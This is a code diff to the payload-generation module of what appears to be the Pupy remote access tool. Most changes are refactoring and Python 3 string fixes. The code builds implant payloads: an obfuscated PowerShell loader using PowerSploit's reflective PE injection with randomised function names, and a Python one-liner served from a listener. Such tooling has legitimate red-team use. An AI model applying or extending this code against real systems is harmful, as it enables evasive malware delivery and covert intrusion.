@@ -40,6 +40,7 @@ from io import open, BytesIO
 from pupylib.utils.listener import get_listener_ip, get_listener_port
 from pupylib.utils.jarsigner import jarsigner
 from pupylib.payloads import dependencies
+from pupylib.utils.arch import make_template_arch
 from pupylib.payloads.dotnet import dotnet_serve_payload, DotNetPayload
 from pupylib.payloads.py_oneliner import (
     serve_payload, pack_py_payload, getLinuxImportedModules
@@ -124,7 +125,7 @@ def get_edit_binary(target, display, path, conf):
     pupylib = dependencies.importer(
         target, (
             'network', 'pupy'
-        ), path=ROOT, as_dict=True
+        ), path=ROOT, ignore_native=True, as_dict=True
     )
 
     new_conf = marshal.dumps([config, pupylib], 2)
@@ -192,10 +193,10 @@ def get_raw_conf(display, conf, verbose=False):
     elif not transport:
         for name in transports:
             transports_list.append(name)
-            conf = transports[name]
+            transports_conf = transports[name]
 
-            if conf.credentials:
-                for cred_name in conf.credentials:
+            if transports_conf.credentials:
+                for cred_name in transports_conf.credentials:
                     required_credentials.add(cred_name)
 
     available = []
@@ -398,6 +399,9 @@ def generate_ps1(
         )[0]
     )
 
+    if isinstance(payload, bytes):
+        payload = payload.decode('ascii')
+
     parts = [
         payload[i:i+SPLIT_SIZE] for i in xrange(
             0, len(payload), SPLIT_SIZE
@@ -408,15 +412,23 @@ def generate_ps1(
     concat_code = []
 
     for i, aPart in enumerate(parts):
-        init_code.append("$PEBytes{0}=\"{1}\"\n".format(i, aPart))
-        concat_code.append("$PEBytes{0}".format(i))
+        init_code.append(
+            '$PEBytes{0}="{1}"\n'.format(i, aPart)
+        )
+        concat_code.append(
+            '$PEBytes{0}'.format(i)
+        )
 
     display(Success('{0} variables used'.format(i + 1)))
 
     script = obfuscatePowershellScript(
-        open(os.path.join(
-            ROOT, "external", "PowerSploit",
-            "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
+        open(
+            os.path.join(
+                ROOT, 'external', 'PowerSploit',
+                'CodeExecution', 'Invoke-ReflectivePEInjection.ps1'
+            ), 'r'
+        ).read()
+    )
 
     # adding some more obfuscation
     random_name = ''.join([
@@ -427,7 +439,7 @@ def generate_ps1(
     script = script.replace('Invoke-ReflectivePEInjection', random_name)
     code = code.replace('Invoke-ReflectivePEInjection', random_name)
 
-    payload = "{0}\n{1}".format(
+    payload = '{0}\n{1}'.format(
         script, code.format(
             ''.join(init_code),
             '+'.join(concat_code)
@@ -450,7 +462,7 @@ def generate_ps1(
         except OSError:
             pass
 
-        outfile = open(outpath, 'w+b')
+        outfile = open(outpath, 'w+')
 
     outpath = outfile.name
     outfile.write(payload)
@@ -491,6 +503,8 @@ def generate_binary_from_template(
             'arch required for the target OS ({})'.format(target.os)
         )
 
+    arch = make_template_arch(target.arch)
+
     shared_ext = 'xxx'
     non_shared_ext = 'xxx'
 
@@ -506,7 +520,7 @@ def generate_binary_from_template(
         ext = non_shared_ext
 
     filename = template.format(
-        arch=target.arch, debug=debug_fmt, ext=ext,
+        arch=arch, debug=debug_fmt, ext=ext,
         pyver=target.pyver_str
     )
 
@@ -999,11 +1013,11 @@ def pupygen(args, config, pupsrv, display):
 
         outfile.write(
             '\n'.join([
-            '#!/usr/bin/env python',
-            '# -*- coding: utf-8 -*-',
-            linux_modules,
-            packed_payload
-        ]).encode('utf-8'))
+                '#!/usr/bin/env python',
+                '# -*- coding: utf-8 -*-',
+                linux_modules,
+                packed_payload
+            ]).encode('utf-8'))
         outfile.close()
 
         outpath = outfile.name
@@ -1015,10 +1029,23 @@ def pupygen(args, config, pupsrv, display):
             )
         )
 
-        i = conf["launcher_args"].index("--host")+1
-        link_ip = conf["launcher_args"][i].split(":", 1)[0]
+        if not isinstance(packed_payload, bytes):
+            packed_payload = packed_payload.encode('ascii')
 
-        serve_payload(display, pupsrv, packed_payload, link_ip=link_ip)
+        try:
+            i = conf['launcher_args'].index('--host') + 1
+            link_ip = conf['launcher_args'][i].split(':', 1)[0]
+        except ValueError:
+            link_ip = None
+
+            for listener in pupsrv.get_listeners().values():
+                if listener.external is not None:
+                    link_ip = str(listener.external)
+                    break
+
+        serve_payload(
+            display, pupsrv, packed_payload, link_ip=link_ip
+        )
 
         raise NoOutput()
 
@@ -1139,7 +1166,7 @@ def pupygen(args, config, pupsrv, display):
             )
 
     else:
-        raise ValueError("Type %s is invalid."%(args.format))
+        raise ValueError("Type %s is invalid." % (args.format))
 
     display(Success('OUTPUT_PATH: {}'.format(os.path.abspath(outpath))))
     display(Success('SCRIPTLETS:  {}'.format(args.scriptlet)))
